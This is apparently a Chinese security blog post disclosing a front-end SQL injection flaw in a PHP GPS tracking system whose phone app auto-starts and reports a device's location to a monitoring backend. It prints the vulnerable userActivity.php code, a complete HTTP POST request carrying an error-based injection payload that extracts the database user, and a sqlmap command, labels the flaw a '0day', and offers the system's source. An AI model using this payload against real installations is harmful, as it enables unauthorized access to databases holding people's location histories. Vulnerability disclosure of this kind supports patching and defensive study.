#  某GPS定位系统存在前台SQL注入漏洞   
 阿乐你好   2025-05-15 01:06  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**手机端强制打开GPS，每3分钟（可调）获取一次所在经纬度，如果位置变化距离超过100米（可调），**  
  
**则提交给后台的PHP。然后后台把得到的数据保存到数据库，再通过前面的百度地图API绘制出轨迹和显示驻留时间。**  
  
**安卓端安装好后，设置开机自启并打开相应的权限，手机会弹出一个ID，**  
  
**拿着ID到后台地址监控页就可以随时查看手机的活动轨迹了。**  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dnZSXYJVCXqcq3sHGQ1LUaJ9AdjvR7PXaS2P1iao8HOxnnHSS2qlMNs0wX5kZibIicrtXG60hG6Jn1A/640?wx_fmt=other&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
**位于 /userActivity.php 中通过 POST 传入 type 及 getUserLocation 参数，且未加过滤，直接带入SQL查询字句中，导致漏洞产生.**  
  
****  
```
if ($type == 'getUserLocation') {    $aid = $_POST['aid'];    $aid = preg_replace('/\|/', "','", $aid);    $rs = mysqli_query($conn, "SELECT * FROM `user_location` WHERE  `aid` IN ('$aid')  ORDER BY id DESC LIMIT 5");    $out = array();    while ($row = mysqli_fetch_object($rs)) {        $out[] = $row;    }}
```  
  
  
Payload:  
  
```
POST /userActivity.php HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, br, zstdAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: max-age=0Connection: keep-aliveContent-Length: 227Content-Type: application/x-www-form-urlencodedCookie: Hm_lvt_d3b3b1b968a56124689d1366adeacf8f=1731328644; _ga=GA1.1.2095806093.1731475984; Hm_lvt_22fbf4ec0601742141df7f652a137a5c=1731635709; Hm_lvt_ddf174778b49d80ad4f7dc54a908a39f=1732349704; su_webp=1; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1734361867Host: 127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"sec-fetch-user: ?1type=getUserLocation&aid=') OR (SELECT 1085 FROM(SELECT COUNT(*),CONCAT((SELECT (USER())),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('UGwc'='UGwc
```  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dnZSXYJVCXqcq3sHGQ1LUaFJwXk8JR5JAIKBRqsVsmzc2f7ia0KVLujrDSbwqxibibibFiaQgicSREeOeg/640?wx_fmt=other&from=appmsg "")  
  
```
Python sqlmap.py -r a.txt
```  
  
  
********## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
  
**GPS源码关注公众号，发送 250425 获取!**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
